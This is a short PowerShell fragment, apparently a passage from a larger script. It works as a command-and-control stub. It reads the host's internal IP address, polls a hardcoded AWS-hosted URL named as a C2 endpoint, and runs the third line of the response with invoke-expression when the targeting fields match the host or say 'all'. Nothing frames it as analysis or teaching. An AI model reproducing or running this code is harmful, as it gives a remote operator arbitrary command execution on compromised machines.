    $hostIP= Get-NetIPAddress | where {($_.IPAddress -like "10.*")} | foreach{$_.IPAddress}
    $cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
        $httpCommand=invoke-restmethod $cNcURL
        $httpCommand | out-file -filepath .\rf.txt

        [string[]]$read = get-content -path .\rf.txt
        rm .\rf.txt
    
        if($read[1] -eq ($hostIP.split("."))[3] -or $read[1] -eq 'all'){
            if($read[0] -eq ($hostIP.split("."))[1] -or $read[0] -eq 'all'){
                invoke-expression $read[2]
            }
            
        }
        
        
    }